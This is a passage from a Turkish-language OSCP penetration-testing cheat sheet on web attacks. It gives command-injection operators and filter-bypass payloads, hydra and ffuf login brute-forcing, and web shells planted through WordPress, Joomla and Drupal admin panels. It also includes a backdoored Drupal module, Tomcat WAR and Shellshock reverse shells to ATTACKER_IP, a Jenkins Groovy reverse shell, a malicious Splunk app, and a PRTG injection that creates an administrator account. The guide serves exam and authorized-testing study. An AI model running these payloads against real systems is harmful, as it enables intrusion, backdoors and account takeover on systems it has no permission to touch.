**Ne:** Ping, arama, doğrulama gibi sistem komutu çalıştıran uygulama girdilerine
komut eklemek. Ping/arıza sayfası tipik adaydır; enjeksiyonu backtick ile de dene.

```bash
# Operatörler
;      # ikisi de çalışır (%3b)
\n     # yeni satır (%0a)
&      # ikisi de, ikinci çıktısı önce gelir (%26)
|      # ikisi de, yalnız ikinci çıktı görünür (%7c)
&&     # ikisi de, birinci başarılıysa (%26%26)
||     # ikinci, birinci başarısızsa (%7c%7c)
`cmd`  # sub-shell, Linux (%60%60)
$(cmd) # sub-shell, Linux (%24%28%29)
#      # sonrasını yorumlar

# Örnek
curl -s "http://TARGET/ping.php?ip=127.0.0.1;whoami"
curl -s "http://TARGET/ping.php?ip=127.0.0.1%0awhoami"

# Blind tespit — çıktı yoksa zaman gecikmesiyle kanıtla
...?ip=127.0.0.1;sleep 5        # Linux
...?ip=127.0.0.1& ping -n 5     # Windows
...?ip=127.0.0.1& timeout 5     # Windows (ping yoksa)
# Çıktıyı zorla: ;whoami > /var/www/html/out.txt ve dosyayı oku
```

**Tuzaklar / notlar:**
- Windows hedefte `;` CMD'de çalışmaz (PowerShell'de çalışır); `&` ve `|`
  her iki shell'de de güvenli seçimdir.
- PHP'de komut çalıştıran fonksiyonlar: `exec`, `passthru`, `system` — kaynak
  erişiminde buraları ara.

### 2.6.2 Filtre bypass'ları

**Boşluk filtresi:**
```bash
%09          # tab
${IFS}       # IFS değişkeni = boşluk+tab
{ls,-la}     # brace expansion otomatik boşluk ekler
```

**Karakter üretimi (slash, noktalı virgül):**
```bash
${PATH:0:1}        # /
${LS_COLORS:10:1}  # ;
# Windows CMD:  echo %HOMEPATH:~6,-11%  →  \
# PowerShell:   $env:HOMEPATH[0]        →  \
# Karakter shift: echo $(tr '!-}' '"-~'<<<[)  →  \   (ASCII'de bir öncekini ver)
# printenv ile tüm değişkenleri incele, içinde gerekli karakter olanı bul
```

**Blacklist filtresi:**
```bash
w'h'o'am'i        # tek/çift tırnak — her iki OS'te de geçerli, tür karıştırma, çift sayıda olmalı
who$@ami          # Linux: $@ yutulur, sayı eşitliği gerekmez
w\ho\am\i         # Linux: backslash yutulur
WhOaMi            # Windows case-insensitive
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")    # Linux'ta küçük harfe çevir

# Ters çevirme
$(rev<<<'imaohw')
# PowerShell: iex "$('imaohw'[-1..-20] -join '')"

# Encode
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
# PowerShell: [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
# bash/base64 blacklist'liyse: sh, openssl (b64 decode), xxd (hex decode)
```

**Otomasyon:**
```bash
# Linux
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
# Windows (pwsh içinde)
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
# SET COMMAND <KOMUT> → encoding → 1
```

**Tuzaklar / notlar:**
- Bypass tekniğini zincirleme: boşluk filtreli + blacklist'li hedefte
  `${IFS}` + tırnak obfuscation birlikte kullanılır.
- Çıktı encode'lu dönebiliyorsa (iconv/base64) payload'ın kendisini encode'la,
  çözümlemeyi shell'e bırak.

## 2.7 Web Brute-Force ve Kimlik Doğrulama Saldırıları

### 2.7.1 HTTP login brute-force — hydra

**Ne:** Form tabanlı login'lere kullanıcı/parola sözlükle saldırı. Başarı
yakalama için F (fail) veya S (success) eşleşmesi gerekir.

```bash
# Form login — parametreleri ^USER^ / ^PASS^ ile işaretle, F= ile başarısız imzasını ver
hydra -L users.txt -P pass.txt TARGET http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
# F= başarısızlık imzası, S= başarılılık imzası (örn. S=302 durumunda "Welcome")

# HTTP Basic Auth
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  TARGET -s 31099 http-get /

# Hedefe özel parola listesi (cupp ile)
cupp -i
```

**Parola politikasına göre listeyi filtrele (hydra kural desteklemez):**
```bash
sed -ri '/^.{,7}$/d' william.txt            # 8'den kısaları at
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # özel karakteri olmayanları at
sed -ri '/[0-9]+/!d' william.txt            # rakam içermeyenleri at
# Kullanıcı adı listesi üretimi
./username-anarchy "Ad Soyad" > users.txt
```

**Tuzaklar / notlar:**
- Browser'dan kopyalanan POST datasında `&` eksik olabilir — kontrol et.
- Kullanıcı adı enum: kayıt/parola-sıfırlama sayfası mevcut kullanıcıyı
  ele verirse ffuf ile brute at (bkz. 2.8.2 mantığı).
- Lockout politikası varsa (Bölüm 1'de ROE notu) hızı düşür; kilitlenme
  pentest'i bloklar.
- Brute-force geneli ve hash kırma: [Bölüm 3](/oscp/03-parola-saldirilari/).

### 2.7.2 Kullanıcı adı enum ve kimlik doğrulama bypass kalıpları

**Ne:** Login öncesi geçerli kullanıcıları bulmak (farklı hata/yanıt boyutu) ve
mantık hatalarıyla login'i atlamak.

```bash
# Kullanıcı enum (aynı response dönene kadar karşılaştır)
ffuf -request req1.txt -w /usr/share/seclists/Usernames/Names/names.txt \
  -request-proto http -fs 3713

# Kullanıcı+parola clusterbomb (yanıt içeriğiyle filtrele)
ffuf -request req2.txt -w valid_users.txt:USER \
  -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:PASS \
  -request-proto http -fr "Invalid Username/Password Combination" -mode clusterbomb
```

**Mantık bypass kalıpları:**
- Parola sıfırlamada: doğrulama sonrası request'te e-posta parametresini başka
  adrese yönlendir; veya aynı parametreyi POST body'sine tekrar ekle (üzerine
  yazma).
- Cookie tampering: `role=user` → `role=admin`, JWT algoritma oyunları
  (`none`, RS256→HS256 downgrade) — bkz. [Bölüm 3](/oscp/03-parola-saldirilari/)
  ve [Bölüm 6](/oscp/06-ad-enumerasyon/) dışı kalan web token notları.
- Session yönetimi: login sonrası session cookie'sini silip kaynaklara hâlâ
  erişebiliyor musun kontrol et; login response'unda role/flag manipülasyonu
  ara.

## 2.8 Yaygın Uygulama Saldırıları

### 2.8.1 WordPress

**Ne:** En yaygın CMS. wpscan ile plugin/tema/user taraması; admin hesabıyla
tema editöründen shell. Plugin readme.txt dosyaları versiyon ele verir.

```bash
# Kullanıcı, tema, plugin, tümü enum
wpscan --url http://TARGET --enumerate u
wpscan --url http://TARGET --enumerate t,p

# Versiyon / tema / plugin elle
curl -s http://TARGET | grep -i wordpress
curl -s http://TARGET | grep themes
curl -s http://TARGET | grep plugins
curl -s http://TARGET/wp-content/plugins/<plugin>/readme.txt   # versiyon burada

# WPVulnDB API token ile zafiyet taraması (token wpscan.com'dan ücretsiz alınır)
wpscan --url http://TARGET --enumerate --api-token <TOKEN>

# Login brute-force — xmlrpc daha hızlıdır
wpscan --password-attack xmlrpc -t 20 -U <KULLANICI> -P /usr/share/wordlists/rockyou.txt \
  --url http://TARGET
```

**Admin hesabıyla shell:**

```text
# Admin panel → Appearance → Theme Editor → 404.php gibi bir dosyaya:
<?php system($_GET["cmd"]); ?>
# Tema dizininden çalıştır:
curl 'http://TARGET/wp-content/themes/<tema>/404.php?cmd=ls'
# veya plugin ekle → PHP shell yükle → Media'dan dizinini bul → çalıştır
```

```bash
# Metasploit alternatifi (authenticated)
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
```

**Tuzaklar / notlar:**
- `/robots.txt`, `/wp-content/uploads/`, `/xmlrpc.php` her zaman kontrol edilir.
- Plugin versiyonu eski zafiyetli olabilir — readme.txt'den versiyonu al,
  exploit-db/searchsploit'de ara.
- Stored XSS varsa nonce zinciriyle (bkz. 2.3.4) admin açıp shell'e git.

### 2.8.2 Joomla

**Ne:** İkinci yaygın CMS. Versiyon fingerprint, droopescan/joomscan tarama,
template editöründen shell.

```bash
# Versiyon fingerprint
curl -s http://TARGET/README.txt | head -n 5
curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --format -
curl -s http://TARGET/plugins/system/cache/cache.xml          # yaklaşık versiyon

# Tarama
droopescan scan joomla --url http://TARGET/
perl joomscan.pl -u http://TARGET --enumerate-components     # bileşen enum

# Login brute
python3 joomla-brute.py -u http://TARGET \
  -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

**Shell (admin girişi sonrası):** Extensions → Templates → aktif template'in
`error.php`'sine `<?php system($_GET["cmd"]); ?>` ekle:

```bash
curl -s "http://TARGET/templates/<tema>/error.php?cmd=id"
```

**Tuzaklar / notlar:**
- Joomla favicon'u ve README.txt varlığı CMS'i ele verir; yoksa JS dosyaları
  (`media/system/js/`) üzerinden versiyon tahmini yapılır.

### 2.8.3 Drupal

**Ne:** Node tabanlı içerik yapısı; droopescan; backdoored modül yükleme.

```bash
droopescan scan drupal -u http://TARGET
curl -s http://TARGET/CHANGELOG.txt     # versiyon
curl -s http://TARGET/node/1            # node numarasıyla içerik
```

**Backdoored modül (admin yetkiyle):**

```bash
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
echo '<?php system($_GET["cmd"]); ?>' > captcha/shell.php
# Drupal /modules erişimini engeller → .htaccess ekle:
cat > captcha/.htaccess <<'EOF'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
EOF
tar cvf captcha.tar.gz captcha/
# Manage → Extend → + Install new module → yükle
curl -s "http://TARGET/modules/captcha/shell.php?cmd=id"
```

**Tuzaklar / notlar:**
- Drupal 8+ PHP Filter modülü default kurulu değildir; modül eklemek
  hedefte değişiklik yapar — yetki/raporlama bağlamında not alınır.
- Admin panel: `/user`, `/admin`.

### 2.8.4 Tomcat

**Ne:** Java uygulama sunucusu. Manager `/manager` ve `/host-manager`; WAR
upload ile RCE; CGI Servlet zafiyeti (CVE-2019-0232); Shellshock (eski CGI).

```bash
# Tespit — Server header veya /docs
curl -sI http://TARGET:8080/ | grep -i server
curl -s http://TARGET:8080/docs/ | grep -i tomcat
# Reverse proxy arkasındaysa geçersiz sayfa iste, header'ı oradan yakala

# WEB-INF/web.xml yol yapısı (uygulama rotalarını ele verir):
# webapps/<app>/WEB-INF/web.xml, /classes (derlenmiş class'lar), /lib, /jsp

# Manager brute-force
python3 mgr_brute.py -U http://TARGET:8180/ -P /manager \
  -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
  -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
# veya msf: auxiliary/scanner/http/tomcat_mgr_login (STOP_ON_SUCCESS=true)

# WAR reverse shell yükleme (Manager'a login sonrası Deploy)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4443 -f war > backup.war
curl -u <KULLANICI>:<PAROLA> -T backup.war "http://TARGET:8080/manager/text/deploy?path=/backup"
nc -lvnp 4443
```

**CGI (CVE-2019-0232 — Windows):**

```bash
# CGI script bul (dizin 404 verse de dosya olabilir)
ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://TARGET:8080/cgi/FUZZ.bat"
ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://TARGET:8080/cgi/FUZZ.cmd"
# Sömür: & ile komut ekle
curl -s "http://TARGET:8080/cgi/welcome.bat?&dir"
# Patch sonrası filtre varsa URL-encode ile bypass:
curl -s "http://TARGET:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe"
```

**Shellshock (eski CGI, Linux):**

```bash
gobuster dir -u http://TARGET/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
# User-Agent'a payload:
curl -s -A '() { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/8443 0>&1' \
  http://TARGET/cgi-bin/access.cgi
```

**Tuzaklar / notlar:**
- AJP portu 8000/8009 açıksa Ghostcat (AJP file inclusion) adaydır:
  `searchsploit ghostcat`.
- Hafif JSP shell (tespit kaçınma): https://github.com/SecurityRiskAdvisors/cmd.jsp
  — bookmarklet tabanlı, AV tespiti düşük.

### 2.8.5 Jenkins

**Ne:** CI sunucusu; Script Console erişimi = Groovy ile RCE.

```text
# Kimliksiz/güvenlik kapalıysa doğrudan:
http://TARGET:8000/script
http://TARGET:8000/configureSecurity/    # güvenlik durumunu gör

# Groovy — komut çalıştırma
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

# Groovy — reverse shell (Linux)
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

# Windows
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

```bash
# MSF alternatifi
msf6 > use exploit/multi/http/jenkins_script_console
```

### 2.8.6 Splunk

**Ne:** Port 8000; eski sürümlerde default `admin:changeme`; trial süresi
dolunca auth'suz free mode'a düşebilir. Zararlı Splunk app (.spl) yükleme.

```bash
# Zararlı app yapısı: <app>/bin/rev.py + <app>/default/inputs.conf
# inputs.conf, bin altındaki scriptleri çalıştırır
tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
mv reverse_shell_splunk.tgz reverse_shell_splunk.spl
# Apps → Manage Apps → Install app from file → yükle
```

**Tuzaklar / notlar:**
- Linux için `rev.py` (pty.spawn), Windows için PowerShell reverse shell —
  upload öncesi IP/port'u düzenle.
- .spl dosyası aslında tar.gz'dir; uzantı değişikliği yükleme formu için.

### 2.8.7 PRTG Network Monitor

**Ne:** Port 80/443/8080; default `prtgadmin:prtgadmin` (kurulum sonrası
değiştirilmemişse). Notification "Execute Program" alanında komut enjeksiyonu
(kurulum öncesi sürümlerde).

```text
# Setup → Account Settings → Notifications → yeni notification
# EXECUTE PROGRAM işaretle
# Program File: Demo exe notification - outfile.ps1
# Parameter: test.txt;net user <KULLANICI> <PAROLA> /add;net localgroup administrators <KULLANICI> /add
```

```bash
# MSF alternatifi: windows/http/prtg_authenticated_rce
```

**Tuzaklar / notlar:**
- Değişiklik bırakan komutlar (kullanıcı ekleme) raporlanır; değerlendirmede
  reverse shell tercih edilir.

## 2.9 Hızlı Referans: Teknik → İlk Komut

| Belirti | İlk hareket |
|---|---|
| `?id=`, `?cat=` parametresi | `'` hata testi → sqlmap |
| Arama/p formu yansıtıyor | `<script>alert(window.origin)</script>` → XSStrike |
| `?file=`, `?page=`, `?language=` | `../../../../etc/passwd` → log poisoning |
| Upload formu | Burp ile uzantı değiştir → magic byte |
| Ping/dns araması var | `;id` → `${IFS}` bypass'ları |
| WordPress izlenimi | wpscan `--enumerate` |
| Port 8080 + Tomcat header | /manager brute → WAR upload |
| Port 8000 + Jenkins | /script Groovy console |
| 403/401 sayfası, cookie yok | ffuf parametre fuzzing |

**Kanıt zinciri notu:** Her bulgu için ham istek/yanıt (curl `-i`, zaman
damgalı), payload ve etki kaydedilir — bkz. [Bölüm 1](/oscp/01-enumerasyon/)
kapsam kuralları ve kanıt hijyeni. Shell sonrası lokalde dinleyen servisler
(`netstat -antp | grep -i list`) iç ağa pivot işaretidir — bkz.
[Bölüm 8](/oscp/08-pivoting/).
{% endraw %}


[← Bölüm 1](/oscp/01-enumerasyon/) · [Bölüm 3 →](/oscp/03-parola-saldirilari/)
